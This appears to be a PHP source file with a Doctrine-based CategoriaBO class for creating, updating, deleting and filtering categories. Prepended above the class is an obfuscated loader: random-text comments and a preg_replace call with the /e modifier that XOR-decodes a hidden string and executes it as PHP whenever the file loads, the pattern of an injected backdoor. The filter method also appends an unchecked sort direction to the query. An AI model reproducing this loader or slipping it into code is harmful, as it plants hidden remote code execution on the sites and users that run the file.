<?php
/*WJpFLZpNvp7csgWb9W3Q31dj31GDN53jChpO7Ubq0XIr4fH
=HtzkSrZYumSlLVH2jDKAuJX31QW9GN8N7wyNcNmM15xAP6
9BysKKjAa69hH6vDqiQIv4UlwHlABdz=emrpxPpNKmuSge
CmUyeoYQv=RxcGw7tdkftPs42cLX8gj0I4
hJ4RJKDlR1h=TGeBWM6MpFklmIjuBVWifP1oa5Prtwq
*/
//X9bBCAnoJLYKhutB=iqZb6GKqwMi7PwTMM
preg_replace("/N85WIRgqBPsBxXbOShY0Sl/e", "DCXsor5uPcNkJtL9qRtNVR39DPCNAfLDhiwLPq7eIIER3PPhh0v3QnzT33h4Ws75QsEgX=AfIExAUCh2ASsQ7hjxYGpvzlpETulrulM3q03=AZ1BsiRnE2ad8FOvr41=mbqVC3Ns2Fr3fh4MEK1JBQn0V2uCujCWAtrCl6ubAbTf9MsCWhL"^"\x2159\x1fGP\x5c\x13x\x0a=\x18\x2f\x00de\x2dv\x2b\x1c\x13\x03f\x7c\x17\x04\x18i\x22\x0ek\x19AIQjpYZ\x01\x7ca\x19\x0e\x17\x0f\x02\x2d9e3\x60\x055\x5d7\x5b\x145\x1dwN\x0a\x15v\x17p\x03i\x0fsWy\x23\x40r\x60z\x0d\x0a\x25f\x12g\x01XX\x1bnt\x11B\x19UC\x21mRERSJmZ\x02CVIi\x06mf\x2c\x3b\x17\x3f\x10w20ca\x3f\x1e\x02kRR\x09\x07V\x0bj\x1an\x08\x12\x23\x04R\x0a\x40h\x11a\x14c\x0f\x13\x04\x2bc\x02iR3\x1d\x1a\x1c4\x2e\x10\x17d1\x1fNB\x24\x1a=\x12\x11dHc\x2aJe", "N85WIRgqBPsBxXbOShY0Sl");?><?php

class CategoriaBO{

	public function create(Categoria $categoria, $conn=null){
		try{
            $categoria->setCreated(date('Y-m-d H:i:s'));
		    CategoriaBO::validate($categoria);
			$categoria->save($conn);
			
			return $categoria;

		} catch(Exception $e){
			throw $e;
		}
	}

	public function update(Categoria $categoria, $conn=null){
		try{
            $categoria->setUpdated(date('Y-m-d H:i:s'));
		    CategoriaBO::validate($categoria);
			$categoria->save($conn);

			return $categoria;

		} catch(Exception $e){
			throw $e;
		}
	}

	public function delete($categoriaId, $conn=null){
        return Doctrine::getTable('Categoria')->find($categoriaId)->delete();
	}
	
	public function get($categoriaId){
        return Doctrine::getTable('Categoria')->find($categoriaId);
	}
	
	public function getByType($type){
        return Doctrine::getTable('Categoria')->findBy('type', $type);
	}
	
	public function getByAlias($alias){
        return Doctrine::getTable('Categoria')->findOneBy('alias', $alias);
	}
	
	public function filter(Search $search){
		$fields = array(
			'id'   	    => 'c.id',
			'categoria' => 'c.categoria',
	        'type'      => 'c.type',
			'alias'     => 'c.alias',
			'parent_id' => 'c.parent_id',
			'created'   => 'c.created',
			'updated'   => 'c.updated',
		);
		
		$query = new Doctrine_Query();
        $query->select('c.*')
              ->from('Categoria c');

        if($search->getFilter() != null){
			$query->where($fields[$search->getFilter()].' LIKE ?', '%'.$search->getQ().'%');
		}
		
		if($search->getOrder() != null){
			$order = $fields[$search->getOrder()];
				
			if($search->getDirection() != null){
                $order.= ' '.$search->getDirection();
			}

            $query->orderBy($order);
		}

		$pager = new Doctrine_Pager($query, $search->getPage(), $search->getMax());
		$categoria = $pager->execute();
		
		$search->setPager($pager);
		
		$categoriaDTO = new DTO();
		$categoriaDTO->setObj($categoria);
		$categoriaDTO->setSearch($search);

		return $categoriaDTO;
	}
	
	public function validate(Categoria $categoria){}
}
